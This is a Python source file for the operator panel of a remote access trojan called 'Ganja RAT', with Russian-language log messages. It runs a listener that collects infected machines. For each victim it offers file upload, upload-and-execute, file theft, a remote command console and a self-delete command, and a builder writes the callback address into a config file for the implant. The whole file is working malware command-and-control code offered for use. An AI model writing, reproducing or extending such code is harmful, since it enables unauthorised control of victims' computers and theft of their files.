import customtkinter as ctk
import socket
import pygame
import os
import json
import queue
import threading
from tkinter import messagebox
from tkinter import filedialog

SETTINGS_FILE = "settings.json"
DEFAULT_SETTINGS = {
    "host": "127.0.0.1",
    "port": 5552,
    "theme": "default"
}

pygame.init()
pygame.mixer.init()

def load_settings():
    if not os.path.exists(SETTINGS_FILE):
        with open(SETTINGS_FILE, "w", encoding="utf-8") as file:
            json.dump(DEFAULT_SETTINGS, file, indent=4, ensure_ascii=False)

    with open(SETTINGS_FILE, "r", encoding="utf-8") as file:
        return json.load(file)

def set_host(host, port):
    settings = load_settings()

    settings["host"] = host
    settings["port"] = port

    with open(SETTINGS_FILE, "w", encoding="utf-8") as file:
        json.dump(settings, file, indent=4, ensure_ascii=False)


class Server:
    def __init__(self, host, port, gui):
        self.host = host 
        self.port = port  
        self.gui = gui  
        self.clients = []  
        self.running = False  

        self.msg_queue = queue.Queue()

    def start_server(self):
        self.running = True
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
                server_socket.bind((self.host, self.port))
                server_socket.listen(10)
                print(f"[+] Сервер запущен на {self.host}:{self.port}")

                while self.running:
                    conn, addr = server_socket.accept()
                    print(f"[+] Новое подключение {addr}")

                    client_info = {"conn": conn, "addr": addr, "ip": addr[0], "port": addr[1], "country": "Unknown"}
                    self.clients.append(client_info)

                    self.gui.after(0, self.gui.create_users_app, self.clients)

                    client_thread = threading.Thread(target=self.handle_client, args=(conn, addr), daemon=True)
                    client_thread.start()
        
                    sound = pygame.mixer.Sound('plus.mp3')
                    sound.play()
        except Exception as e:
            print(f"[-] Ошибка сервера: {e}")
        finally:
            self.running = False

    def stop_server(self):
        self.running = False
        print("[+] Сервер остановлен.")

    def send_msg(self, msg):
        messagebox.showinfo('Ganja rat', msg)

    def handle_client(self, conn, addr):
        ip, port = addr
        try:
            with conn:
                while self.running:
                    command = conn.recv(1024).decode('utf-8').strip()
                    print(f"[+] Сообщения от {addr}: {command}")
                    if not command:
                        break  
                    
                    self.msg_queue.put((addr, command))

                    """
                    if 'download' in command:
                        threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()"
                    """

        except (ConnectionError, socket.error) as e:
            print(f"[-] Клиент {addr} отключился: {e}")
        finally:
            print(f"[-] Подключение с {addr} закрыто")
            self.remove_client(addr)

    def send_to_client(self, ip, port, message):
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                try:
                    client["conn"].send(message.encode('utf-8'))
                    print(f"[+] Сообщение отправлено {ip}:{port}")

                    if 'send' in message:
                        filepath = message[4:].strip()
                        print(f'Отправка: {filepath}')
                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()

                    elif 'send_run' in message:
                        filepath = message[8:].strip()
                        print(f'Отправка и запуск: {filepath}')
                        threading.Thread(target=self.send_file, args=(filepath, ip, port), daemon=True).start()

                    elif 'download' in message:
                        file = message[8:].strip()
                        print(f'Скачивание: {file}')
                        threading.Thread(target=self.download_file, args=('', ip, port), daemon=True).start()

                except Exception as e:
                    print(f"[-] Ошибка отправки {ip}:{port}: {e}")
                return
        print(f"[-] Клиент {ip}:{port} не найден.")

    def send_file(self, filename, ip, port):
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                try:
                    if os.path.exists(filename):
                        file_size = os.path.getsize(filename)
                        header = f"FILE {file_size} {os.path.basename(filename)}".encode('utf-8')
                        client["conn"].send(header.ljust(1024)) 

                        with open(filename, 'rb') as file:
                            while True:
                                data = file.read(24576)  
                                if not data:
                                    break
                                client["conn"].send(data)  
                        print(f"[+] Файл {filename} отправлен клиенту {ip}:{port}.")
                    else:
                        client["conn"].send(b"FILE_NOT_FOUND")
                        print(f"[-] Файл {filename} не найден.")
                except Exception as e:
                    print(f"[-] Ошибка при отправке файла клиенту {ip}:{port}: {e}")
                return
        print(f"[-] Клиент {ip}:{port} не найден.")

    def download_file(self, save_path, ip, port):
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                try:
                    client["conn"].send(b"SEND_FILE")

                    header = client["conn"].recv(1024).decode('utf-8').strip()
                    if header.startswith("FILE"):
                        parts = header.split()
                        file_size = int(parts[1])
                        filename = parts[2]

                        save_filename = os.path.join(save_path, filename)
                        with open(save_filename, 'wb') as file:
                            received = 0
                            while received < file_size:
                                data = client["conn"].recv(24576)
                                if not data:
                                    break
                                file.write(data)
                                received += len(data)
                        print(f"[+] Файл {filename} успешно загружен от клиента {ip}:{port}.")
                    else:
                        print("[-] Ошибка при загрузке файла: неверный заголовок.")
                except Exception as e:
                    print(f"[-] Ошибка при загрузке файла от клиента {ip}:{port}: {e}")
                return
        print(f"[-] Клиент {ip}:{port} не найден.")

    def remove_client(self, addr):
        ip, port = addr
        print(f"Удаление клиента: {ip}:{port}")
        for client in self.clients:
            if client["ip"] == ip and client["port"] == port:
                self.clients.remove(client)
                break
        self.gui.after(0, self.gui.create_users_app, self.clients)


class GanjaRATApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Ganja RAT")
        self.geometry("1000x500")
        self.resizable(False, True)
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("green")

        self.users = []
        self.user_frames = []

        self.load = load_settings()
        self.HOST, self.PORT = self.load['host'], self.load['port']

        self.server = Server(self.HOST, self.PORT, self)

        server_thread = threading.Thread(target=self.server.start_server, daemon=True)
        server_thread.start()

        self.create_app()

    def create_app(self):
        self.gbw_frame = ctk.CTkFrame(self, width=1000, height=100, fg_color='green')
        self.gbw_title = ctk.CTkLabel(self.gbw_frame, text='Ganja RAT - made by GBW!', text_color='black', font=('Bold', 30))
        self.gbw_frame.pack(side='top', fill='x')
        self.gbw_title.pack(side='left', pady=10)

        self.menu = ctk.CTkFrame(self, width=1000, height=30, fg_color='#000000')
        self.menu.pack(side='top', fill='x')

        self.text_ip = ctk.CTkLabel(self.menu, text='IP', text_color='white', font=('Bold', 20))
        self.text_port = ctk.CTkLabel(self.menu, text='PORT', text_color='white', font=('Bold', 20))
        self.text_contry = ctk.CTkLabel(self.menu, text='CONTRY', text_color='white', font=('Bold', 20))
        self.builder_btn = ctk.CTkButton(self.menu, height=10, width=100, text='BUILD', text_color='red', font=('Bold', 15),
                                          fg_color='black', command=self.draw_config_app)
        self.info_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Info', text_color='red', font=('Bold', 15),
                                          fg_color='black', command=self.draw_info_app)
        self.setting_btn = ctk.CTkButton(self.menu, height=10, width=100, text='Setting', text_color='red', font=('Bold', 15),
                                          fg_color='black', command=self.draw_settings_app)
        self.text_ip.pack(side='left', padx=75)
        self.text_port.pack(side='left', padx=75)
        self.text_contry.pack(side='left', padx=75)
        self.builder_btn.pack(side='right', padx=5)
        self.setting_btn.pack(side='right', padx=5)
        self.info_btn.pack(side='right', padx=5)

    def create_user(self, ip, port, country):
        user_ground = ctk.CTkFrame(self, width=970, height=150, fg_color='green', corner_radius=10)
        user_ground.pack(side='top', padx=10, pady=5, fill='x')

        user_ip = ctk.CTkLabel(user_ground, text=f"IP: {ip}", text_color="white", font=('Bold', 15))
        user_port = ctk.CTkLabel(user_ground, text=f"Port: {port}", text_color="white", font=('Bold', 15))
        user_contry = ctk.CTkLabel(user_ground, text=f"Country: {country}", text_color="white", font=('Bold', 15))
        user_ip.pack(side='left', padx=50)
        user_port.pack(side='left', padx=50)
        user_contry.pack(side='left', padx=50)

        select_func_button = ctk.CTkButton(user_ground, width=300, height=45, text='Function', font=('Bold', 20),
                                           corner_radius=10, command=lambda: self.draw_func_app(ip, port))
        select_func_button.pack(side='right', pady=5, padx=5)

        self.user_frames.append(user_ground)

    def clear_users(self):
        for frame in self.user_frames:
            frame.destroy()
        self.user_frames.clear()

    def create_users_app(self, users: list):
        self.clear_users() 
        for user in users:
            self.create_user(user["ip"], user["port"], user["country"])

    def draw_settings_app(self):
        self.setting_app = SettingsApp(self)
        self.setting_app.grab_set()

    def draw_info_app(self):
        self.info_app = InfoApp(self)
        self.info_app.grab_set()

    def draw_config_app(self):
        self.config_app = ConfigApp(self) 
        self.config_app.grab_set() 

    def draw_func_app(self, ip, port):
        func_app = FunctionApp(ip, port, self.server)
        threading.Thread(target=func_app.mainloop())


class SettingsApp(ctk.CTkToplevel): 
    def __init__(self, parent):
        super().__init__(parent) 

        self.title("Setting")
        self.geometry("600x500")
        self.resizable(False, False)

        self.load = load_settings()
        self.host, self.port = self.load['host'], self.load['port']

        self.create_host_app()

    def create_host_app(self):
        self.input_frame = ctk.CTkFrame(self, width=300, corner_radius=10, fg_color="gray30")
        self.input_frame.pack(side='top', pady=10, padx=10)

        self.label_host = ctk.CTkLabel(self.input_frame, text='Host and port', text_color='green', font=('Bold', 30))
        self.label_host.pack(side='top', pady=5, padx=10)

        self.input_host = ctk.CTkEntry(self.input_frame, width=300, placeholder_text=f'HOST: {self.host}', font=('Bold', 20), text_color='green')
        self.input_port = ctk.CTkEntry(self.input_frame, width=300, placeholder_text=f'PORT: {self.port}', font=('Bold', 20), text_color='green')
        self.input_host.pack(side='top', pady=5, padx=15)
        self.input_port.pack(side='top', pady=5, padx=15)

        self.set_host_btn = ctk.CTkButton(self.input_frame, width=250, height=40, text='Set', font=('Bold', 30),
                                           command=self.update_host)
        self.set_host_btn.pack(padx=10, pady=5)
    
    def update_host(self):
        host = self.input_host.get()
        port = int(self.input_port.get())

        set_host(host, port)

        self.input_host.delete(0, "end")
        self.input_port.delete(0, "end")

        self.input_host.configure(placeholder_text=host)
        self.input_port.configure(placeholder_text=port)


class InfoApp(ctk.CTkToplevel): 
    def __init__(self, parent):
        super().__init__(parent) 

        self.title("Info")
        self.geometry("600x500")
        self.resizable(False, False)


class ConfigApp(ctk.CTkToplevel): 
    def __init__(self, parent):
        super().__init__(parent) 

        self.title("Build Config")
        self.geometry("600x500")
        self.resizable(False, False)

        self.create_config_app()

    def create_config_app(self):
        self.login_frame = ctk.CTkFrame(self, fg_color="gray30", corner_radius=10)
        self.login_frame.pack(side='top', pady=40, padx=20, fill="both", expand=True)

        self.login_title = ctk.CTkLabel(self.login_frame, text='Build config file', text_color='green', font=('Bold', 60))
        self.login_title.pack(side='top', pady=10)

        self.entry_ip = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="IP", text_color='green', font=('Bold', 50))
        self.entry_ip.pack(pady=10, padx=20)

        self.entry_port = ctk.CTkEntry(self.login_frame, width=500, height=75, placeholder_text="PORT", text_color='green', font=('Bold', 50))
        self.entry_port.pack(pady=10, padx=20)

        self.btn = ctk.CTkButton(self.login_frame, width=250, height=50, text="Enter", command=self.remove_frame)
        self.btn.pack()

    def build_info_file(self, ip, port):
        config_info_list = [f'{ip}\n', f'{port}\n']
        try:
            with open('playit.txt', 'w', encoding='utf-8') as file:
                file.writelines(config_info_list)
            return True
        except Exception:
            return False

    def remove_frame(self):
        ip = self.entry_ip.get()
        port = self.entry_port.get()
        build = self.build_info_file(ip, port)
        self.destroy()
        if build:
            messagebox.showinfo('Ganja RAT', 'Config file has been build, drop this to main file')
        else:
            messagebox.showerror('Ganja RAT', 'Build config file has been not complete! Error')


class FunctionApp(ctk.CTk):
    def __init__(self, ip, port, server):
        super().__init__()

        self.ip = ip
        self.port = port
        self.server = server

        self.title("Function")
        self.geometry("600x500")
        
        self.comm = CommandFunction(self.server)
        self.create_func_app()

        #self.comm.download_file(ip, port, 'playit.txt') - скачивание файла
    
    def create_func_app(self):
        self.gbw_func_frame = ctk.CTkFrame(self, width=600, height=60, fg_color='green')
        self.gbw_func_title = ctk.CTkLabel(self.gbw_func_frame, text=f'Func for target: {self.ip}', text_color='black', font=('Bold', 25))
        self.gbw_func_frame.pack(side='top', fill='x')
        self.gbw_func_title.pack(side='top', pady=10)

        self.tabview = ctk.CTkTabview(self)
        self.tabview.pack(side='top', fill='both', expand=True)

        self.tabview.add("Function")
        self.tabview.add("Fun")
        self.tabview.add("System")
        self.tabview.add("Files")
        self.tabview.add("Info")

        self.add_content_to_tabs()

    def add_content_to_tabs(self):
        self.func_tab = self.tabview.tab("Function")
    
        self.ping_btn = ctk.CTkButton(self.func_tab, text='DELETE YOURSELF FROM PC', height=50, width=500, fg_color='red',
                                       command=lambda: self.comm.kill_yourself(self.ip, self.port, "exit"), font=('Bold', 20))
        self.send_file_btn = ctk.CTkButton(self.func_tab, text='Sendfile', height=50, width=200,
                                       command=lambda: self.comm.send_file(self.ip, self.port), font=('Bold', 15))
        self.send_and_run_btn = ctk.CTkButton(self.func_tab, text='Send and run', height=50, width=200,
                                       command=lambda: self.comm.send_and_run(self.ip, self.port), font=('Bold', 15))
        self.console_btn = ctk.CTkButton(self.func_tab, text='Console', height=50, width=200,
                                       command=lambda: self.comm.console(self.ip, self.port), font=('Bold', 15))
        
        self.ping_btn.pack(side='bottom', pady=20, padx=20)
        self.send_file_btn.pack(side='top', pady=10, padx=50)
        self.send_and_run_btn.pack(side='top', pady=10, padx=50)
        self.console_btn.pack(side='top', pady=10, padx=50)


        self.fun_tab = self.tabview.tab("Fun")
        

        self.sys_tab = self.tabview.tab("System")
        

        self.file_tab = self.tabview.tab("Files")
        

        self.info_tab = self.tabview.tab("Info")
        

    def show_tab(self, tab_name):
        self.tabview.set(tab_name)


class CommandFunction:
    def __init__(self, server):
        self.server = server

    def console(self, ip, port):
        self.console_app = ConsoleApp(ip, port, self.server)

    def send_msg(self, msg):
        messagebox.showinfo('Ganja rat', msg)

    def send_and_run(self, ip, port):
        file_path = filedialog.askopenfilename(title="Select file")
        if file_path:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'send_run {file_path}'), daemon=True).start()
    
    def send_file(self, ip, port):
        file_path = filedialog.askopenfilename(title="Select file")
        if file_path:
            threading.Thread(target=self.server.send_to_client, args=(ip, port, f'send {file_path}'), daemon=True).start()

    def download_file(self, ip, port, filename):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, f'download {filename}'), daemon=True).start()

    def kill_yourself(self, ip, port, msg):
        threading.Thread(target=self.server.send_to_client, args=(ip, port, msg), daemon=True).start()


class ConsoleApp(ctk.CTkToplevel): 
    def __init__(self, ip, port, server):
        super().__init__()

        self.ip = ip
        self.port = port
        self.server = server

        self.title("Ganja console")
        self.geometry("600x500")
        self.resizable(False, False)

        self.create_console_app()
        threading.Thread(target=self.listen_for_messages, daemon=True).start()

    def create_console_app(self):
        self.console_frame = ctk.CTkFrame(self, fg_color="gray20")
        self.console_frame.pack(fill="both", expand=True, padx=10, pady=10)

        self.console_output = ctk.CTkTextbox(self.console_frame, wrap="word", state="disabled")
        self.console_output.pack(fill="both", expand=True, padx=10, pady=10)

        self.console_input = ctk.CTkEntry(self.console_frame, placeholder_text="Enter a command...")
        self.console_input.pack(fill="x", padx=10, pady=10)

        self.send_button = ctk.CTkButton(self.console_frame, text="Send", command=self.send_command)
        self.send_button.pack(pady=10)

    def send_command(self):
        command = self.console_input.get().strip()
        if command:
            threading.Thread(
                target=self.server.send_to_client,
                args=(self.ip, self.port, f'console {command}'),
                daemon=True
            ).start()
            self.console_input.delete(0, "end")
            self.append_output(f"> {command}")

    def listen_for_messages(self):
        while True:
            addr, message = self.server.msg_queue.get()
            if addr[0] == self.ip:
                self.append_output(message)

    def append_output(self, text):
        self.console_output.configure(state="normal")
        self.console_output.insert("end", text + "\n")
        self.console_output.configure(state="disabled")
        self.console_output.see("end") 


if __name__ == "__main__":
    app = GanjaRATApp()
    app.mainloop()